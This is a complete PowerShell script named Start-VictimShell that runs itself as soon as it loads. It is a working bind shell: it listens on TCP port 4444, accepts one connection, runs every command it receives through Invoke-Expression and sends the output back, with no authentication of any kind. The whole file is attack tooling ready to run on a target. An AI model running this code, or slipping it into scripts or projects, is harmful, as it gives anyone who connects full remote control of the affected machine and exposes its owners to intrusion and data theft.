Function Start-VictimShell(){
  $listen_port = 4444
  $MAX_RECV_BYTES = 8192
  $MAX_ATTEMPTS = 10
  $prompt_string = "PS:Remote>"
  $prompt = [System.Text.Encoding]::ASCII.GetBytes($prompt_string)
  $bye = [System.Text.Encoding]::ASCII.GetBytes("Bye!`n`n")
  $keep_listening = $true
  # Attempt to listen on TCP port $listen_port
  $attempt_ctr = 0
  while($attempt_ctr -le $MAX_ATTEMPTS -and $attempt_ctr -ne -1){
    $attempt_ctr++
    try{
      $listener = [System.Net.Sockets.TcpListener]$listen_port
      $listener.Start()
      $attempt_ctr = -1
    }catch{
      " [-] There was an error starting the listener`n [-] $_`n [-] Attempt $attempt_ctr/$MAX_ATTEMPTS"
      if($attempt_ctr -ge $MAX_ATTEMPTS){
        return
      }else{
        Start-Sleep -Seconds 10
      }
    }
  }
  Write-Host " [*] Listening on port $listen_port"

  # Main Loop
  $client = $listener.AcceptTcpClient()
  Write-Host " [*] Connected!"
  while($keep_listening){
    $stream = $client.GetStream()
    $stream.Write($prompt, 0, $prompt.Length)
    $bytes = New-Object byte[] $MAX_RECV_BYTES
    $stream.Read($bytes, 0, $bytes.Length) | Out-Null
    $data = [System.Text.Encoding]::ASCII.GetString($bytes)
    $data = $data.trim(" `n`t`r`0")
    Write-Host " [*] Got $data"
    if($data -eq "quit"){
      $keep_listening = $false
      $stream.Write($bye, 0, $bye.Length)
      $stream.Flush()
      $stream.Dispose()
    }elseif($data -ne ""){
      $response_string = Invoke-Expression $data
      $response_string = $response_string | Out-String
      $response = [System.Text.Encoding]::ASCII.GetBytes($response_string)
      $stream.Write($response, 0, $response.Length)
      $stream.Flush()
    }
  }

  $stream.Flush()
  $stream.Dispose()
  $client.Close()
  $listener.Stop()
  Write-Host " [*] Done"
}

Start-VictimShell
